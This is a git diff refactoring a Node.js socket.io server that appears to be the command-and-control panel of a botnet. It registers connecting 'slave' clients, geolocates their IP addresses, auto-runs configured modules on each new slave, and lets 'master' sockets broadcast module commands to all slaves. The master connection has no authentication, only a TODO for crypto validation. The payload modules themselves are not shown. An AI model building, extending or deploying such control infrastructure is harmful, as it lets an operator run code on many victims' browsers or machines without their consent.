@@ -24,13 +24,30 @@ let slaveSockets = [];
 let slaveGeo = {};
 let slaveCountries = [];
 
-let modulesSettings = {
+const defaultModulesSettings = {
 	onConnectModules: []
 };
 
-let serverSettings = {
+const defaultServerSettings = {
 	port: 8080
 };
+
+let modulesSettings = {};
+let serverSettings = {};
+
+let mod = {};
+mod.onModuleConfigChange = (module, config, def) => {
+	(!def ? modulesSettings : defaultModulesSettings)[module.name] = config;
+	if (!def) saveSettings();
+}
+
+mod.getModuleSettings = () => {
+	return modulesSettings;
+}
+Modules.importModules(mod);
+
+modulesSettings = {...defaultModulesSettings};
+serverSettings = {...defaultServerSettings};
 
 let control_panel_html_path = path.join(__dirname, "control_panel");
 let client_html_path = path.join(__dirname, "..", "client");
@@ -40,7 +57,7 @@ app.set("views", control_panel_html_path);
 app.use(express.static(control_panel_html_path));
 
 // Add headers
-app.use(function (req, res, next) {
+app.use((req, res, next) => {
 
     // Website you wish to allow to connect
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -59,25 +76,25 @@ app.use(function (req, res, next) {
     next();
 });
 
-io.origins("*");
+io.origins((orig, call) => call(null, true));
 
-app.get("/", function(req, res) {
+app.get("/", (req, res) => {
 	res.render("index", { version: ver });
 });
 
-app.get("/clients", function(req, res) {
+app.get("/clients", (req, res) => {
 	res.render("clients");
 });
 
 app.use("/client", express.static(client_html_path));
 
 Modules.getAllModules().forEach(module => {
-	if (module.widgetPath) {
-		app.use("/"+module.name, express.static(path.parse(module.widgetPath).dir));
+	if (module.widgetPaths[0]) {
+		app.use("/"+module.name, express.static(path.resolve(path.parse(module.widgetPaths[0]).dir)));
 	}
 });
 
-app.get("/modules", function(req, res) {
+app.get("/modules", (req, res) => {
 	let renderedWidgets = [];
 
 	Modules.getAllModules().forEach(module => {
@@ -91,18 +108,19 @@ app.get("/modules", function(req, res) {
 	
 	res.render("modules", {
 		autoRunListModules: Modules.getAllModules().filter(module => module.isAutoRun),
-		onConnectModules: modulesSettings.onConnectModules,
+		modulesSettings: modulesSettings,
 		modules: Modules.getAllModules(),
 		renderedWidgets: renderedWidgets
 	});
 });
 
-io.on("connection", function(socket) {
+io.on("connection", (socket) => {
 	let ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress).address || "localhost";
-	
+	socket.ip = ip;
+
 	socket.debugExecFunc = debug;
-	
-	socket.on("disconnect", function() {
+
+	socket.on("disconnect", () => {
 		if (socket.mode == "slave" && slaveSockets.indexOf(socket) != -1) {
 			slaveSockets.pop(socket);
 
@@ -111,18 +129,19 @@ io.on("connection", function(socket) {
 			if (slaveGeo[socket.country].length == 0)
 				slaveCountries.pop(socket.country);
 				
-			console.log("slave disconnected");
+			console.log("Slave disconnected ("+socket.ip+")");
 		} else {
-			console.log("master disconnected");
+			console.log("Master disconnected ("+socket.ip+")");
 		}
 	});
 	
 	//TODO: Crypto validation on master connection
-	socket.on("postConnection", function(mode) {
+	socket.on("postConnection", (mode) => {
+		socket.mode = mode;
 		if (mode === "slave") {
 			slaveSockets.push(socket);
 								
-			request("http://www.geoplugin.net/json.gp?ip="+ip, function (error, response, body) {
+			request("http://www.geoplugin.net/json.gp?ip="+ip, (error, response, body) => {
 				let json = JSON.parse(body);
 
 				if (slaveGeo[json["geoplugin_countryName"]] == null) 
@@ -135,13 +154,13 @@ io.on("connection", function(socket) {
 				if (slaveCountries.indexOf(socket.country) == -1)
 					slaveCountries.push(socket.country);
 			});
-			console.log("new slave connection from: "+ ip);
+			console.log("New slave connection from: "+ ip);
 
-			modulesSettings.onConnectModules.forEach(function(name) {
+			modulesSettings.onConnectModules.forEach((name) => {
 				Modules.getModule(name).exec(socket);
 			});
 		} else if (mode === "master") {
-			socket.on("updateClientData", function() {
+			socket.on("updateClientData", () => {
 				
 				let data = [];
 				
@@ -152,13 +171,16 @@ io.on("connection", function(socket) {
 				socket.emit("getClientsData", data, slaveGeo);
 			});
 
-			socket.on("updateModuleSettings", function(data) {
-				modulesSettings = data;
-				saveSettings();
-				console.log(data);
+			socket.on("getModuleSettings", () => {
+				socket.emit("getModuleSettings", modulesSettings);
 			});
 
-			socket.on("shutdown", function() {
+			socket.on("updateModuleSettings", (data) => {
+				modulesSettings = data;
+				saveSettings();
+			});
+
+			socket.on("shutdown", () => {
 				if (ip === "localhost") {
 					process.exit();
 				}
@@ -168,60 +190,55 @@ io.on("connection", function(socket) {
 				module.controlPanelEvents.forEach(event => {
 					socket.on(event.name, data => {
 						event.function(data, socket, slaveSockets);
-						console.log("ress");
 					});
 				});
 			});
 
-			console.log("new master connection from: "+ ip);
+			console.log("New master connection from: "+ ip);
 		}
-		socket.mode = mode;
 	});
 	
 });
 
 function onShutdown(exitCode, signal) {
 	console.log("Shutdown!");
-	saveSettings();
 }
 
-function saveSettings() {
+function saveSettings(callback) {
+	
+	modulesSettings = Object.assign(defaultModulesSettings, modulesSettings);
+	serverSettings = Object.assign(defaultServerSettings, serverSettings);
 
 	let modulesSettingsJson = JSON.stringify(modulesSettings, null, "\t");
-	fs.writeFile("modulesSettings.json", modulesSettingsJson, function() {
+	fs.writeFile("modulesSettings.json", modulesSettingsJson, () => {
 
 		let serverSettingsJson = JSON.stringify(serverSettings, null, "\t");
 		fs.writeFileSync("serverSettings.json", serverSettingsJson);
 
+		if (callback) callback();
 	});
 	
 }
 
 function loadSettings(callback) {
-	fs.exists("modulesSettings.json", function(exists) {
-		if (exists) {
-			fs.readFile("modulesSettings.json", function(err, data) {
-				console.log(data);
-				modulesSettings = JSON.parse(data);
-				console.log(modulesSettings);
-			});
-		}
-	});
-	fs.exists("serverSettings.json", function(exists) {
-		fs.readFile("serverSettings.json", function(err, data) {
-			if (!err) {
-				serverSettings = JSON.parse(data);
-			}
-		});
-	});
+	if (fs.existsSync("modulesSettings.json")) {
+		let data = fs.readFileSync("modulesSettings.json");
 
+		modulesSettings = JSON.parse(data);
+	}
+	if (fs.existsSync("serverSettings.json")) {
+		let data = fs.readFileSync("serverSettings.json");
+
+		serverSettings = JSON.parse(data);
+	}
 	saveSettings();
+
 	if (callback) callback();
 }
 
-loadSettings(function() {
+loadSettings(() => {
 
-	http.listen(serverSettings.port, function() {
+	http.listen(serverSettings.port, () => {
 		console.log("listening on *:"+serverSettings.port);
 		console.log("Control panel: http://localhost:"+serverSettings.port+"/");
 	
@@ -229,3 +246,4 @@ loadSettings(function() {
 	});
 
 });
+
